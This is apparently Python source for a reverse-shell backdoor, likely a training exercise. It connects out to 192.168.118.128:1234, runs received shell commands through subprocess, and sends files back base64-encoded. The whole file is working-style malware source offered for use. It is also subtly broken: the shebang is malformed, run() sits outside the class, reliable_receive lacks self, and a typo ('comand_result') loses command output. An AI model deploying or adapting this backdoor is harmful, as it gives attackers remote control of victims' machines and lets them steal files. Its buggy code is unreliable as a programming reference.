#!/usr/env/bin/env python

import socket
import subprocess
import json
import os
import base64

class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue
                
    def execute_system_command(self, command):
        return subprocess.check_output(command, shell=True)

    def change_working_directory_to(self, path):
        os.chdir(path)
        return "[+] Changing working directory to " + path

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

def run(self):
    while True:
        command = reliable_receive()

        try:
            if command[0] == "exit":
                self.connection.close()
                exit()
            elif command[0] == "cd" and len(command) > 1:
                command_result = self.change_working_directory_to(command[1])
            elif command[0] == "download" or command[0] == "Download" or command[0] == "get":
                command_result = self.read_file(command[1])
            else:
                comand_result = self.execute_system_command(command)
        except Exception:
            command_result = "[-] Error during command execution."
            

        self.reliable_send(command_result)

my_backdoor = Backdoor("192.168.118.128", 1234)
my_backdoor.run()
